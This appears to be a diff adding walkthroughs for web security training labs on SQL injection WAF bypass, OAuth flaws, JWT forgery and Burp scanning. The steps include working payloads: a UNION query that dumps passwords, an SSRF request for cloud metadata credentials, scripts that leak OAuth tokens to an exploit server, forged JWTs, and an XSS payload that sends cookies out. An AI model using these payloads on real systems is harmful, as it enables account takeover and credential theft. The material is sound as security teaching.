@@ -25,6 +25,20 @@ You can find some useful payloads on our [SQL injection cheat sheet](https://por
 3.  Use the following payload to retrieve the contents of the `users` table: `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
 4.  Verify that the application's response contains usernames and passwords.
 
+### Lab: SQL injection with filter bypass via XML encoding
+1. Observe that the stock check feature sends the productId and storeId to the application in XML format.
+2. Send the POST /product/stock request to Burp Repeater.
+3. In Burp Repeater, probe the storeId to see whether your input is evaluated. For example, try replacing the ID with mathematical expressions that evaluate to other potential IDs, for example: `<storeId>1+1</storeId>`
+4. Observe that your input appears to be evaluated by the application, returning the stock for different stores.
+5. Try determining the number of columns returned by the original query by appending a UNION SELECT statement to the original store ID: `<storeId>1 UNION SELECT NULL</storeId>`
+6. Observe that your request has been blocked due to being flagged as a potential attack.
+7. As you're injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the Hackvertor extension. Just highlight your input, right-click, then select Extensions > Hackvertor > Encode > dec_entities/hex_entities.
+8. Resend the request and notice that you now receive a normal response from the application. This suggests that you have successfully bypassed the WAF.
+9. Pick up where you left off, and deduce that the query returns a single column. When you try to return more than one column, the application returns 0 units, implying an error.
+10. As you can only return one column, you need to concatenate the returned usernames and passwords, for example: `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`
+11. Send this query and observe that you've successfully fetched the usernames and passwords from the database, separated by a ~ character.
+12. Use the administrator's credentials to log in and solve the lab.
+
 ## Cross-Site Scripting (XSS)
 
 ### Lab: Exploiting cross-site scripting to capture passwords
@@ -1491,6 +1505,280 @@ To inject newlines into HTTP/2 headers, use the Inspector to drill down into the
 7.  When the attack finished, notice that one response was found that contains the `New passwords do not match` message. Make a note of this password.
 8.  In your browser, log out of your own account and lock back in with the username `carlos` and the password that you just identified.
 9.  Click "My account" to solve the lab.
+
+## OAuth authentication
+
+### Lab: Authentication bypass via OAuth implicit flow
+
+1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
+2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that make up the OAuth flow. This starts from the authorization request `GET /auth?client_id=[...].`
+3. Notice that the client application (the blog website) receives some basic information about the user from the OAuth service. It then logs the user in by sending a POST request containing this information to its own /authenticate endpoint, along with the access token.
+4. Send the POST /authenticate request to Burp Repeater. In Repeater, change the email address to carlos@carlos-montoya.net and send the request. Observe that you do not encounter an error.
+5. Right-click on the POST request and select "Request in browser" > "In original session". Copy this URL and visit it in the browser. You are logged in as Carlos and the lab is solved.
+
+### Lab: SSRF via OpenID dynamic client registration
+
+1. While proxying traffic through Burp, log in to your own account. Browse to https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration to access the configuration file. Notice that the client registration endpoint is located at /reg.
+2. In Burp Repeater, create a suitable POST request to register your own client application with the OAuth service. You must at least provide a redirect_uris array containing an arbitrary whitelist of callback URIs for your fake application. For example:
+   
+    `POST /reg HTTP/1.1
+    Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
+    Content-Type: application/json
+
+    {
+        "redirect_uris" : [
+            "https://example.com"
+        ]
+    }`
+   
+4. Send the request. Observe that you have now successfully registered your own client application without requiring any authentication. The response contains various metadata associated with your new client application, including a new client_id.
+5. Using Burp, audit the OAuth flow and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo. This is fetched from /client/CLIENT-ID/logo. We know from the OpenID specification that client applications can provide the URL for their logo using the logo_uri property during dynamic registration. Send the GET /client/CLIENT-ID/logo request to Burp Repeater.
+6. In Repeater, go back to the POST /reg request that you created earlier. Add the logo_uri property. Right-click and select "Insert Collaborator payload" to paste a Collaborator URL as its value . The final request should look something like this:
+   
+    `POST /reg HTTP/1.1
+    Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
+    Content-Type: application/json
+
+    {
+        "redirect_uris" : [
+            "https://example.com"
+        ],
+        "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"
+    }`
+   
+7. Send the request to register a new client application and copy the client_id from the response.
+8. In Repeater, go to the GET /client/CLIENT-ID/logo request. Replace the CLIENT-ID in the path with the new one you just copied and send the request.
+9. Go to the Collaborator tab dialog and check for any new interactions. Notice that there is an HTTP interaction attempting to fetch your non-existent logo. This confirms that you can successfully use the logo_uri property to elicit requests from the OAuth server.
+10. Go back to the POST /reg request in Repeater and replace the current logo_uri value with the target URL: `"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"`
+11. Send this request and copy the new client_id from the response.
+12. Go back to the `GET /client/CLIENT-ID/logo` request and replace the client_id with the new one you just copied. Send this request. Observe that the response contains the sensitive metadata for the OAuth provider's cloud environment, including the secret access key.
+13. Use the "Submit solution" button to submit the access key and solve the lab.
+
+### Lab: Forced OAuth profile linking
+
+1. While proxying traffic through Burp, click "My account". You are taken to a normal login page, but notice that there is an option to log in using your social media profile instead. For now, just log in to the blog website directly using the classic login form.
+2. Notice that you have the option to attach your social media profile to your existing account.
+3. Click "Attach a social profile". You are redirected to the social media website, where you should log in using your social media credentials to complete the OAuth flow. Afterwards, you will be redirected back to the blog website.
+4. Log out and then click "My account" to go back to the login page. This time, choose the "Log in with social media" option. Observe that you are logged in instantly via your newly linked social media account.
+5. In the proxy history, study the series of requests for attaching a social profile. In the GET /auth?client_id[...] request, observe that the redirect_uri for this functionality sends the authorization code to /oauth-linking. Importantly, notice that the request does not include a state parameter to protect against CSRF attacks.
+6. Turn on proxy interception and select the "Attach a social profile" option again.
+7. Go to Burp Proxy and forward any requests until you have intercepted the one for GET /oauth-linking?code=[...]. Right-click on this request and select "Copy URL".
+8. Drop the request. This is important to ensure that the code is not used and, therefore, remains valid.
+9. Turn off proxy interception and log out of the blog website.
+10. Go to the exploit server and create an iframe in which the src attribute points to the URL you just copied. The result should look something like this: `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>`
+11. Deliver the exploit to the victim. When their browser loads the iframe, it will complete the OAuth flow using your social media profile, attaching it to the admin account on the blog website.
+12. Go back to the blog website and select the "Log in with social media" option again. Observe that you are instantly logged in as the admin user. Go to the admin panel and delete carlos to solve the lab.
+
+### Lab: OAuth account hijacking via redirect_uri
+
+1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
+2. Log out and then log back in again. Observe that you are logged in instantly this time. As you still had an active session with the OAuth service, you didn't need to enter your credentials again to authenticate yourself.
+3. In Burp, study the OAuth flow in the proxy history and identify the most recent authorization request. This should start with GET /auth?client_id=[...]. Notice that when this request is sent, you are immediately redirected to the redirect_uri along with the authorization code in the query string. Send this authorization request to Burp Repeater.
+4. In Burp Repeater, observe that you can submit any arbitrary value as the redirect_uri without encountering an error. Notice that your input is used to generate the redirect in the response.
+5. Change the redirect_uri to point to the exploit server, then send the request and follow the redirect. Go to the exploit server's access log and observe that there is a log entry containing an authorization code. This confirms that you can leak authorization codes to an external domain.
+6. Go back to the exploit server and create the following iframe at /exploit: `<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`
+7. Store the exploit and click "View exploit". Check that your iframe loads and then check the exploit server's access log. If everything is working correctly, you should see another request with a leaked code.
+8. Deliver the exploit to the victim, then go back to the access log and copy the victim's code from the resulting request.
+9. Log out of the blog website and then use the stolen code to navigate to: `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`
+10. The rest of the OAuth flow will be completed automatically and you will be logged in as the admin user. Open the admin panel and delete carlos to solve the lab.
+
+### Lab: Stealing OAuth access tokens via an open redirect
+
+1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
+2. Study the resulting requests and responses. Notice that the blog website makes an API call to the userinfo endpoint at /me and then uses the data it fetches to log the user in. Send the GET /me request to Burp Repeater.
+3. Log out of your account and log back in again. From the proxy history, find the most recent `GET /auth?client_id=[...]` request and send it to Repeater.
+4. In Repeater, experiment with the GET /auth?client_id=[...] request. Observe that you cannot supply an external domain as redirect_uri because it's being validated against a whitelist. However, you can append additional characters to the default value without encountering an error, including the /../ path traversal sequence.
+5. Log out of your account on the blog website and turn on proxy interception in Burp.
+6. In the browser, log in again and go to the intercepted `GET /auth?client_id=[...]` request in Burp Proxy.
+7. Confirm that the redirect_uri parameter is in fact vulnerable to directory traversal by changing it to: `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1`
+8. Forward any remaining requests and observe that you are eventually redirected to the first blog post. In the browser, notice that your access token is included in the URL as a fragment.
+9. With the help of Burp, audit the other pages on the blog website. Identify the "Next post" option at the bottom of each blog post, which works by redirecting users to the path specified in a query parameter. Send the corresponding `GET /post/next?path=[...]` request to Repeater.
+10. In Repeater, experiment with the path parameter. Notice that this is an open redirect. You can even supply an absolute URL to elicit a redirect to a completely different domain, for example, your exploit server.
+11. Craft a malicious URL that combines these vulnerabilities. You need a URL that will initiate an OAuth flow with the redirect_uri pointing to the open redirect, which subsequently forwards the victim to your exploit server: `https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email`
+12. Test that this URL works correctly by visiting it in the browser. You should be redirected to the exploit server's "Hello, world!" page, along with the access token in a URL fragment.
+13. On the exploit server, create a suitable script at /exploit that will extract the fragment and output it somewhere. For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead:
+    `<script>
+    window.location = '/?'+document.location.hash.substr(1)
+    </script>`
+14. To test that everything is working correctly, store this exploit and visit your malicious URL again in the browser. Then, go to the exploit server access log. There should be a request for `GET /?access_token=[...]`.
+15. You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example:
+    `<script>
+        if (!document.location.hash) {
+            window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+        } else {
+            window.location = '/?'+document.location.hash.substr(1)
+        }
+    </script>`
+16.To test that the exploit works, store it and then click "View exploit". The page should appear to refresh, but if you check the access log, you should see a new request for `GET /?access_token=[...]`.
+17. Deliver the exploit to the victim, then copy their access token from the log.
+18. In Repeater, go to the GET /me request and replace the token in the Authorization: Bearer header with the one you just copied. Send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.
+19. Use the "Submit solution" button at the top of the lab page to submit the stolen key and solve the lab.
+
+## JWT
+
+### Lab: JWT authentication bypass via unverified signature
+
+1. In the lab, log in to your own account.
+2. In Burp, go to the Proxy > HTTP history tab and look at the post-login `GET /my-account` request. Observe that your session cookie is a JWT.
+3. Double-click the payload part of the token to view its decoded JSON form in the Inspector panel. Notice that the sub claim contains your username. Send this request to Burp Repeater.
+4. In Burp Repeater, change the path to `/admin` and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.
+5. Select the payload of the JWT again. In the Inspector panel, change the value of the sub claim from wiener to administrator, then click Apply changes.
+6. Send the request again. Observe that you have successfully accessed the admin panel.
+7. In the response, find the URL for deleting carlos (/admin/delete?username=carlos). Send the request to this endpoint to solve the lab.
+
+### Lab: JWT authentication bypass via flawed signature verification
+
+1. In the lab, log in to your own account.
+2. In Burp, go to the Proxy > HTTP history tab and look at the post-login `GET /my-account` request. Observe that your session cookie is a JWT.
+3. Double-click the payload part of the token to view its decoded JSON form in the Inspector panel. Notice that the sub claim contains your username. Send this request to Burp Repeater.
+4. In Burp Repeater, change the path to `/admin` and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.
+5. Select the payload of the JWT again. In the Inspector panel, change the value of the sub claim to administrator, then click Apply changes.
+6. Select the header of the JWT, then use the Inspector to change the value of the alg parameter to none. Click Apply changes.
+7. In the message editor, remove the signature from the JWT, but remember to leave the trailing dot after the payload.
+8. Send the request and observe that you have successfully accessed the admin panel.
+9. In the response, find the URL for deleting carlos (/admin/delete?username=carlos). Send the request to this endpoint to solve the lab.
+
+### Lab: JWT authentication bypass via weak signing key
+
+1. In Burp, load the JWT Editor extension from the BApp store.
+2. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater.
+3. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.
+4. Copy the JWT and brute-force the secret. You can do this using hashcat as follows: `hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list`
+5. If you're using hashcat, this outputs the JWT, followed by the secret. If everything worked correctly, this should reveal that the weak secret is secret1.
+
+Note
+Note that if you run the command more than once, you need to include the --show flag to output the results to the console again.
+
+6. Using Burp Decoder, Base64 encode the secret that you brute-forced in the previous section.
+7. In Burp, go to the JWT Editor Keys tab and click New Symmetric Key. In the dialog, click Generate to generate a new key in JWK format. Note that you don't need to select a key size as this will automatically be updated later.
+8. Replace the generated value for the k property with the Base64-encoded secret.
+9. Click OK to save the key.
+10. Go back to the GET /admin request in Burp Repeater and switch to the extension-generated JSON Web Token message editor tab.
+11. In the payload, change the value of the sub claim to administrator
+12. At the bottom of the tab, click Sign, then select the key that you generated in the previous section.
+13. Make sure that the Don't modify header option is selected, then click OK. The modified token is now signed with the correct signature.
+14. Send the request and observe that you have successfully accessed the admin panel.
+15. In the response, find the URL for deleting carlos (/admin/delete?username=carlos). Send the request to this endpoint to solve the lab.
+
+### Lab: JWT authentication bypass via jwk header injection
+
+1. In Burp, load the JWT Editor extension from the BApp store.
+2. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater.
+3. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.
+4. Go to the JWT Editor Keys tab in Burp's main tab bar.
+5. Click New RSA Key.
+6. In the dialog, click Generate to automatically generate a new key pair, then click OK to save the key. Note that you don't need to select a key size as this will automatically be updated later.
+7. Go back to the GET /admin request in Burp Repeater and switch to the extension-generated JSON Web Token tab.
+8. In the payload, change the value of the sub claim to administrator.
+9. At the bottom of the JSON Web Token tab, click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key and click OK.
+10. In the header of the JWT, observe that a jwk parameter has been added containing your public key.
+11. Send the request. Observe that you have successfully accessed the admin panel.
+12. In the response, find the URL for deleting carlos (/admin/delete?username=carlos). Send the request to this endpoint to solve the lab.
+
+Note
+
+Instead of using the built-in attack in the JWT Editor extension, you can embed a JWK by adding a jwk parameter to the header of the JWT manually. In this case, you need to also update the kid header of the token to match the kid of the embedded key.
+
+### Lab: JWT authentication bypass via jku header injection
+
+1. In Burp, load the JWT Editor extension from the BApp store.
+2. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater.
+3. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.
+4. Go to the JWT Editor Keys tab in Burp's main tab bar.
+5. Click New RSA Key.
+6. In the dialog, click Generate to automatically generate a new key pair, then click OK to save the key. Note that you don't need to select a key size as this will automatically be updated later.
+7. In the browser, go to the exploit server.
+8. Replace the contents of the Body section with an empty JWK Set as follows:
+
+    {
+        "keys": [
+
+        ]
+    }
+
+9. Back on the JWT Editor Keys tab, right-click on the entry for the key that you just generated, then select Copy Public Key as JWK.
+10. Paste the JWK into the keys array on the exploit server, then store the exploit. The result should look something like this:
+
+    {
+        "keys": [
+            {
+                "kty": "RSA",
+                "e": "AQAB",
+                "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7",
+                "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
+            }
+        ]
+    }
+
+11. Go back to the GET /admin request in Burp Repeater and switch to the extension-generated JSON Web Token message editor tab.
+12. In the header of the JWT, replace the current value of the kid parameter with the kid of the JWK that you uploaded to the exploit server.
+13. Add a new jku parameter to the header of the JWT. Set its value to the URL of your JWK Set on the exploit server.
+14. In the payload, change the value of the sub claim to administrator.
+15. At the bottom of the tab, click Sign, then select the RSA key that you generated in the previous section.
+16. Make sure that the Don't modify header option is selected, then click OK. The modified token is now signed with the correct signature.
+17. Send the request. Observe that you have successfully accessed the admin panel.
+18. In the response, find the URL for deleting carlos (/admin/delete?username=carlos). Send the request to this endpoint to solve the lab.
+
+### Lab: JWT authentication bypass via kid header path traversal
+
+
+Note
+
+In this solution, we'll point the kid parameter to the standard file /dev/null. In practice, you can point the kid parameter to any file with predictable contents.
+
+1. In Burp, load the JWT Editor extension from the BApp store.
+2. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater.
+3. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.
+4. Go to the JWT Editor Keys tab in Burp's main tab bar.
+5. Click New Symmetric Key.
+6. In the dialog, click Generate to generate a new key in JWK format. Note that you don't need to select a key size as this will automatically be updated later.
+7. Replace the generated value for the k property with a Base64-encoded null byte (AA==). Note that this is just a workaround because the JWT Editor extension won't allow you to sign tokens using an empty string.
+8. Click OK to save the key.
+9. Go back to the GET /admin request in Burp Repeater and switch to the extension-generated JSON Web Token message editor tab.
+10. In the header of the JWT, change the value of the kid parameter to a path traversal sequence pointing to the /dev/null file: `../../../../../../../dev/null`
+11. In the JWT payload, change the value of the sub claim to administrator.
+12. At the bottom of the tab, click Sign, then select the symmetric key that you generated in the previous section.
+13. Make sure that the Don't modify header option is selected, then click OK. The modified token is now signed using a null byte as the secret key.
+14. Send the request and observe that you have successfully accessed the admin panel.
+15. In the response, find the URL for deleting carlos (/admin/delete?username=carlos). Send the request to this endpoint to solve the lab.
+
+## Essential Skills
+
+### Lab: Scanning non-standard data structures
+
+1. Log in to your account with the provided credentials.
+2. In Burp, go to the Proxy > HTTP history tab.
+3. Find the GET /my-account?id=wiener request, which contains your new authenticated session cookie.
+4. Study the session cookie and notice that it contains your username in cleartext, followed by a token of some kind. These are separated by a colon, which suggests that the application may treat the cookie value as two distinct inputs.
+5. Select the first part of the session cookie, the cleartext wiener.
+6. Right-click and select Scan selected insertion point, then click OK.
+7. Go to the Dashboard and wait for the scan to complete.
+
+Approximately one minute after the scan starts, notice that Burp Scanner reports a Cross-site scripting (stored) issue. It has detected this by triggering an interaction with the Burp Collaborator server.
+Note
+
+Note
+
+The delay in reporting the issue is due to the polling interval. By default, Burp polls the Burp Collaborator server for new interactions every minute.
+
+8. In the Dashboard, select the identified issue.
+9. In the lower panel, open the Request tab. This contains the request that Burp Scanner used to identify the issue.
+10. Send the request to Burp Repeater.
+11. Go to the Collaborator tab and click Copy to clipboard. A new Burp Collaborator payload is saved to your clipboard.
+12. Go to the Repeater tab and use the Inspector to view the cookie in its decoded form.
+13. Using the Collaborator payload you just copied, replace the proof-of-concept that Burp Scanner used with an exploit that exfiltrates the victim's cookies. For example: `'"><svg/onload=fetch(``//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}``)>:YOUR-SESSION-ID`
+
+Note that you need to preserve the second part of the cookie containing your session ID.
+    
+14. Click Apply changes, and then click Send.
+15. Go back to the Collaborator tab. After approximately one minute, click Poll now. Notice that the Collaborator server has received new DNS and HTTP interactions.
+16. Select one of the HTTP interactions.
+17. On the Request to Collaborator tab, notice that the path of the request contains the admin user's cookies.
+18. Copy the admin user's session cookie.
+19. Go to Burp's browser and open the DevTools menu.
+20. Go to the Application tab and select Cookies.
+21. Replace your session cookie with the admin user's session cookie, and refresh the page.
+22. Access the admin panel and delete carlos to solve the lab.
 
 # System Access
 
